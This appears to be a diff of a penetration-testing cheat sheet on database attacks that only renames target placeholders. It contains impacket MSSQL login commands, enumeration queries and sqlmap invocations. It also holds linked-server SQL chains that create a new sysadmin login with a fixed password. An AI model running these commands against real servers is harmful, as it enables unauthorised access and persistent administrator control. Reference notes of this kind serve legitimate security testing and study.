@@ -41,7 +41,7 @@ $ impacket-mssqlclient <USERNAME>@<RHOST>
 $ impacket-mssqlclient <USERNAME>@<RHOST> -windows-auth
 
 $ export KRB5CCNAME=<USERNAME>.ccache
-$ impacket-mssqlclient -k <RHOST>.<TARGET_DOMAIN>
+$ impacket-mssqlclient -k <RHOST>.<DOMAIN>
 
 SQL> SELECT name FROM master.dbo.sysdatabases;
 SQL> use <DATABASE>;
@@ -245,16 +245,16 @@ sqlite> SELECT ## FROM db1.DeletedUserAudit;
 SQL> SELECT user_name();
 SQL> SELECT name,sysadmin FROM syslogins;
 SQL> SELECT srvname,isremote FROM sysservers;
-SQL> EXEC ('SELECT current_user') at [<TARGET_DOMAIN>\<CONFIG_FILE>];
-SQL> EXEC ('SELECT srvname,isremote FROM sysservers') at [<TARGET_DOMAIN>\<CONFIG_FILE>];
-SQL> EXEC ('EXEC (''SELECT suser_name()'') at [<TARGET_DOMAIN>\<CONFIG_FILE>]') at [<TARGET_DOMAIN>\<CONFIG_FILE>];
+SQL> EXEC ('SELECT current_user') at [<DOMAIN>\<CONFIG_FILE>];
+SQL> EXEC ('SELECT srvname,isremote FROM sysservers') at [<DOMAIN>\<CONFIG_FILE>];
+SQL> EXEC ('EXEC (''SELECT suser_name()'') at [<DOMAIN>\<CONFIG_FILE>]') at [<DOMAIN>\<CONFIG_FILE>];
 ```
 
 ### Register new Sysadmin User
 
 ```c
-SQL> EXEC ('EXEC (''EXEC sp_addlogin ''''sadmin'''', ''''p4ssw0rd!'''''') at [<TARGET_DOMAIN>\<CONFIG_FILE>]') at [<TARGET_DOMAIN>\<CONFIG_FILE>];
-SQL> EXEC ('EXEC (''EXEC sp_addsrvrolemember ''''sadmin'''',''''sysadmin'''''') at [<TARGET_DOMAIN>\<CONFIG_FILE>]') at [<TARGET_DOMAIN>\<CONFIG_FILE>];
+SQL> EXEC ('EXEC (''EXEC sp_addlogin ''''sadmin'''', ''''p4ssw0rd!'''''') at [<DOMAIN>\<CONFIG_FILE>]') at [<DOMAIN>\<CONFIG_FILE>];
+SQL> EXEC ('EXEC (''EXEC sp_addsrvrolemember ''''sadmin'''',''''sysadmin'''''') at [<DOMAIN>\<CONFIG_FILE>]') at [<DOMAIN>\<CONFIG_FILE>];
 ```
 
 ### Python Code Execution
@@ -331,7 +331,7 @@ proxyDict = {
               "http"  : http_proxy,
             }
 
-url = "<TARGET_URL>/?search=admin"
+url = "<DOMAIN>/?search=admin"
 
 done = False
 pos = 0
@@ -705,7 +705,7 @@ $ sqlmap http://<RHOST>/ --eval="FROM flask_unsign import session as s; session 
 ### Using Web Sockets
 
 ```c
-$ sqlmap --url "ws://<TARGET_DOMAIN>" --data='{"params":"help","token":"<TOKEN>"}'
+$ sqlmap --url "ws://<DOMAIN>" --data='{"params":"help","token":"<TOKEN>"}'
 ```
 
 ### Getting Shell
